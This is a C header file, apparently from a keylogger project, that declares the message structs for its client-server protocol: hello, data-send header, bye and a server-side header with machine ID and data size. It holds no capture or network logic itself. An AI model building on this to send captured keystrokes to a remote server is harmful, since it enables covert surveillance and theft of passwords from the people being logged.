//
// Created by konrad on 25.01.16.
//

#ifndef KEYLOGGER_PROTOCOL_MESSAGES_H
#define KEYLOGGER_PROTOCOL_MESSAGES_H

#include <stdint.h>

struct __attribute__((__packed__)) hello_msg {
    uint8_t msgType;
    uint32_t protocolVersion;
    uint32_t machineId;
};

struct hello_msg buildHelloMsg(const uint32_t protocolVersion, const uint32_t machineId);

struct __attribute__((__packed__)) send_msg_header {
    uint8_t msgType;
    uint32_t dataSize;
};

struct send_msg_header buildSendMsgHeader(const uint32_t dataSize);

struct __attribute__((__packed__)) bye_msg {
    uint8_t msgType;
};

struct bye_msg buildByeMsg();

// server side:

struct __attribute__((__packed__)) ok_id_data_header {
    uint32_t machineId;
    uint32_t dataSize;
};

struct ok_id_data_header deserializeOkIdDataHeader(const char* data);

#endif //KEYLOGGER_PROTOCOL_MESSAGES_H
